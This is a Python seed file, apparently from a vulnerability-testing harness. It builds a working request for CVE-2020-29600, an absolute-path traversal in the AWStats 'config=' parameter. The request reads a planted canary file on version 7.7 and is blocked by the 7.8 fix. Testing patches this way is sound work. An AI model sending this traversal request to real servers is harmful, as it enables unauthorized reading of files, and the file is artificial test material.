#!/usr/bin/env python3
"""[GIVEN] CVE-2020-29600 seed exploit — an ABSOLUTE-pathname path traversal in
the AWStats `config=` parameter.

AWStats' Read_Config opens the value passed via `config=` as its configuration
file. Up to 7.7 it kept a File::Spec->rel2abs($SiteConfig) fallback that opens an
already-absolute `config=` path directly. By pointing `config=` at a full
absolute path OUTSIDE the served root / config dirs, an attacker makes AWStats
read+parse that file; here the defended out-of-tree file
(/etc/pcb_canary/flag.conf, planted from $PCB_FLAG) is a one-line `Include
"<FLAG>"`, so parsing it reflects the FLAG in the unopenable-include error page.

Contract: reaches the canary on V0 (AWStats 7.7) via the rel2abs fallback;
BLOCKED on V1 (AWStats 7.8), because the CVE-2020-29600 fix comments out that
rel2abs absolute-path fallback, and the remaining Read_Config search loop only
opens `$searchdir$SiteConfig`, so a full absolute path (leading `/`) no longer
resolves to the canary. This is the seed the system-under-test is given.
"""
from __future__ import annotations

# Full absolute pathname to the out-of-tree canary. Reaches it on 7.7 via the
# rel2abs fallback; on 7.8 the fallback is gone, so the leading `/` makes every
# `$searchdir$SiteConfig` concatenation miss (== CVE-2020-29600 closed).
PATH = "/cgi-bin/awstats.pl?config=/etc/pcb_canary/flag.conf"


def candidate() -> dict:
    """The request candidate (candidate_schema.json shape) for this seed."""
    return {"probe_id": "cve-2020-29600-absolute-config", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
